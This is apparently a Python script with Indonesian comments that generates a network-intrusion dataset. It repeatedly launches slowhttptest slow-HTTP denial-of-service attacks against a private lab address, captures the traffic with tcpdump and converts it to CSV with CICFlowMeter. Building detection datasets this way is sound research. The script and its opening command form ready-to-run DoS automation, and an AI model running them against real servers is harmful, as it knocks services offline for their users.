## attack 1 jam dengan attack parameter seperti di bawah ini

#slowhttptest -c 100 -H -i 5 -r 20 -t GET -u http://192.168.100.122 -x 24 -p 10 -l 60
# ini contoh yang aku pakai selama ini, tapi bisa diubah sesuai kebutuhan aka lebih sederhana

# Attack      : 50 (default)
# Connections : 50 (default)
# Runtime     : 240 sec
# Interval    : 10 (default)
# Follow-up   : -

# Attack      : 200
# Connections : 100
# Runtime     : 240 sec
# Interval    : 10
# Follow-up   : -

# Attack      : 300
# Connections : 100
# Runtime     : 240 sec
# Interval    : 10
# Follow-up   : -

# Attack      : 400
# Connections : 100
# Runtime     : 240 sec
# Interval    : 15
# Follow-up   : -

# Attack      : 500
# Connections : 100
# Runtime     : 240 sec
# Interval    : 10 / 15 / 17 / 20
# Follow-up   : -

# Attack      : 600
# Connections : 100
# Runtime     : 240 sec
# Interval    : 10 / 15 / 17 / 20
# Follow-up   : -

## saat attack ini jangan lupa trafficnya dicapture dengan tcpdump dan pcap taruh di /home/victim/project/data/pcap/. terserah yang mana duluan tcpdump atau attack command, yang penting capture seluruh trafficnya

## dari pcap itu langsung convert ke csv dengan cicflowmeter dan taruh di /home/victim/project/data/csv/ dengan nama file sesuai dengan nama pcapnya, misal pcapnya slowread.pcap maka csvnya jadi slowread.csv

import subprocess
import os
import time
import sys
import csv

PCAP_DIR = "../data/pcap/"
CSV_DIR = "../data/csv/"
TARGET_URL = "http://192.168.100.122"
INTERFACE = "ens18"

# Ambil durasi total dari argumen command-line, default 3600 detik (1 jam) jika tidak diberikan
if len(sys.argv) > 1:
    try:
        TOTAL_RUNTIME = int(sys.argv[1])
    except ValueError:
        print("Argumen durasi harus berupa angka (detik).")
        sys.exit(1)
else:
    TOTAL_RUNTIME = 3600

# List of attack configurations: (attack_name, total_connections, interval_list)
attack_configs = [
    ("attack_50", 50, [10]),
    ("attack_200", 200, [10]),
    ("attack_300", 300, [10]),
    ("attack_400", 400, [15]),
    ("attack_500", 500, [10, 15, 17, 20]),
    ("attack_600", 600, [10, 15, 17, 20]),
]

# Runtime per attack (detik)
RUNTIME_PER_ATTACK = 240

def file_summary(pcap_file, csv_file):
    pcap_size = os.path.getsize(pcap_file) / (1024 * 1024) if os.path.exists(pcap_file) else 0
    csv_size = os.path.getsize(csv_file) / (1024 * 1024) if os.path.exists(csv_file) else 0
    csv_rows = 0
    if os.path.exists(csv_file):
        with open(csv_file, 'r') as f:
            reader = csv.reader(f)
            csv_rows = sum(1 for _ in reader) - 1  # minus header
    print(f"[SUMMARY] {os.path.basename(pcap_file)}: {pcap_size:.2f} MB")
    print(f"[SUMMARY] {os.path.basename(csv_file)}: {csv_size:.2f} MB, {csv_rows} baris")

def run_attack_and_capture(attack_name, total_connections, interval_list, runtime):
    for intv in interval_list:
        timestamp = int(time.time())
        pcap_file = os.path.join(PCAP_DIR, f"{attack_name}_intv{intv}_{timestamp}.pcap")
        csv_file = os.path.join(CSV_DIR, f"{attack_name}_intv{intv}_{timestamp}.csv")
        print(f"\n[INFO] Menjalankan attack: {attack_name}, total_connections: {total_connections}, runtime: {runtime}, interval: {intv}")
        print(f"[INFO] Capture ke: {pcap_file}")

        # Start tcpdump
        tcpdump_cmd = f"timeout {runtime} tcpdump -i {INTERFACE} -w {pcap_file} port 80"
        tcpdump_proc = subprocess.Popen(tcpdump_cmd, shell=True)
        time.sleep(2)  # Pastikan tcpdump sudah jalan sebelum attack

        # Start attack
        attack_cmd = f"slowhttptest -c {total_connections} -H -i {intv} -r 100 -t GET -u {TARGET_URL} -l {runtime}"
        print(f"[INFO] Menjalankan: {attack_cmd}")
        subprocess.run(attack_cmd, shell=True)

        tcpdump_proc.wait()
        print(f"[INFO] tcpdump selesai untuk {pcap_file}")

        # Convert pcap to csv
        cicflowmeter_cmd = f"cicflowmeter -f {pcap_file} -c {csv_file}"
        print(f"[INFO] Konversi pcap ke csv: {csv_file}")
        subprocess.run(cicflowmeter_cmd, shell=True)
        print(f"[INFO] Selesai konversi ke {csv_file}")

        # Summary
        file_summary(pcap_file, csv_file)

if __name__ == "__main__":
    os.makedirs(PCAP_DIR, exist_ok=True)
    os.makedirs(CSV_DIR, exist_ok=True)
    start_time = time.time()
    while True:
        for attack_name, total_connections, intervals in attack_configs:
            elapsed = time.time() - start_time
            if elapsed >= TOTAL_RUNTIME:
                print(f"\n[INFO] Waktu total {TOTAL_RUNTIME} detik sudah tercapai. Selesai.")
                sys.exit(0)
            run_attack_and_capture(attack_name, total_connections, intervals, RUNTIME_PER_ATTACK)